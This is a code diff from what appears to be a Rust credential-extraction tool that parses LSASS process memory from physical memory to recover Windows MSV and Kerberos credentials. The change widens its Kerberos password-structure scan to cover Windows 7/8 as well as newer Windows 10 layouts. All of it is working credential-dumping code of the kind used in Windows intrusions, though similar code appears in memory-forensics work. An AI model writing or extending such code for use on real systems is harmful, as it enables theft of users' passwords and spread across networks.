@@ -3,7 +3,7 @@ use crate::lsass::crypto::{self, CryptoKeys};
 use crate::lsass::types::{Credential, KerberosCredential, MsvCredential};
 use crate::memory::{PhysicalMemory, VirtualMemory};
 use crate::paging::translate::{PageTableWalker, ProcessMemory};
-use crate::windows::offsets::WIN10_X64_LDR;
+use crate::windows::offsets::X64_LDR;
 use crate::windows::peb::{self, LoadedModule};
 use crate::windows::process::Process;
 
@@ -50,7 +50,7 @@ pub fn extract_all_credentials<P: PhysicalMemory>(
     );
 
     // Enumerate DLLs in LSASS
-    let modules = peb::enumerate_modules(&lsass_vmem, lsass.peb_vaddr, &WIN10_X64_LDR)?;
+    let modules = peb::enumerate_modules(&lsass_vmem, lsass.peb_vaddr, &X64_LDR)?;
 
     log::debug!("LSASS modules:");
     for m in &modules {
@@ -723,52 +723,48 @@ fn scan_phys_for_kerberos_credentials<P: PhysicalMemory>(
                 continue;
             }
 
-            // --- Check +0x20 is NOT a UNICODE_STRING (rules out UNICODE_STRING arrays) ---
-            // In a real credential, +0x20 is unk0 (PVOID) which is typically 0 or a pointer.
-            // In a UNICODE_STRING array, +0x20 would be Length(u16)/MaxLength(u16)/pad(u32).
-            // If the low u16 at +0x20 is small, even, and the u16 at +0x22 >= it, and
-            // the u32 at +0x24 is 0, it looks like a UNICODE_STRING -> skip.
-            let gap_u16_0 = u16::from_le_bytes(
-                page_data[off + 0x20..off + 0x22].try_into().unwrap(),
-            ) as usize;
-            let gap_u16_1 = u16::from_le_bytes(
-                page_data[off + 0x22..off + 0x24].try_into().unwrap(),
-            ) as usize;
-            let gap_pad = u32::from_le_bytes(
-                page_data[off + 0x24..off + 0x28].try_into().unwrap(),
-            );
-            if gap_u16_0 > 0 && gap_u16_0 <= 0x200 && gap_u16_0.is_multiple_of(2)
-                && gap_u16_1 >= gap_u16_0 && gap_pad == 0
-            {
-                // Looks like another UNICODE_STRING at +0x20 -> this is an array, not a credential
-                continue;
-            }
+            // Try both Win10 1607+ layout (gap at +0x20, Password at +0x30)
+            // and Win7/8/Win10-1507 layout (Password at +0x28, no gap).
+            // For Win10 1607+, +0x20 is unk0 PVOID, not a UNICODE_STRING.
+            // For Win7/8, +0x20 IS the Password UNICODE_STRING (or at +0x28).
+            let mut found_pwd = false;
+            for &pwd_off in &[0x30u64, 0x28] {
+                let po = pwd_off as usize;
+                if off + po + 0x10 > 0x1000 {
+                    continue;
+                }
 
-            // --- Password UNICODE_STRING at +0x30 ---
-            let pwd_len = u16::from_le_bytes(
-                page_data[off + 0x30..off + 0x32].try_into().unwrap(),
-            ) as usize;
-            let pwd_max = u16::from_le_bytes(
-                page_data[off + 0x32..off + 0x34].try_into().unwrap(),
-            ) as usize;
-            let pwd_pad = u32::from_le_bytes(
-                page_data[off + 0x34..off + 0x38].try_into().unwrap(),
-            );
-            let pwd_buf = u64::from_le_bytes(
-                page_data[off + 0x38..off + 0x40].try_into().unwrap(),
-            );
+                let pwd_len = u16::from_le_bytes(
+                    page_data[off + po..off + po + 2].try_into().unwrap(),
+                ) as usize;
+                let pwd_max = u16::from_le_bytes(
+                    page_data[off + po + 2..off + po + 4].try_into().unwrap(),
+                ) as usize;
+                let pwd_pad = u32::from_le_bytes(
+                    page_data[off + po + 4..off + po + 8].try_into().unwrap(),
+                );
+                let pwd_buf = u64::from_le_bytes(
+                    page_data[off + po + 8..off + po + 16].try_into().unwrap(),
+                );
 
-            if pwd_len == 0 || pwd_len > 0x200 || pwd_max < pwd_len || pwd_pad != 0 {
-                continue;
-            }
-            if pwd_buf < 0x10000 || (pwd_buf >> 48) != 0 {
-                continue;
-            }
+                if pwd_len == 0 || pwd_len > 0x200 || pwd_max < pwd_len || pwd_pad != 0 {
+                    continue;
+                }
+                if pwd_buf < 0x10000 || (pwd_buf >> 48) != 0 {
+                    continue;
+                }
 
-            // All three buffer pointers should be in a similar heap region
-            let min_buf = user_buf.min(dom_buf).min(pwd_buf);
-            let max_buf = user_buf.max(dom_buf).max(pwd_buf);
-            if max_buf - min_buf > 0x100000 {
+                // All buffer pointers should be in a similar heap region
+                let min_buf = user_buf.min(dom_buf).min(pwd_buf);
+                let max_buf = user_buf.max(dom_buf).max(pwd_buf);
+                if max_buf - min_buf > 0x100000 {
+                    continue;
+                }
+
+                found_pwd = true;
+                break;
+            }
+            if !found_pwd {
                 continue;
             }
 
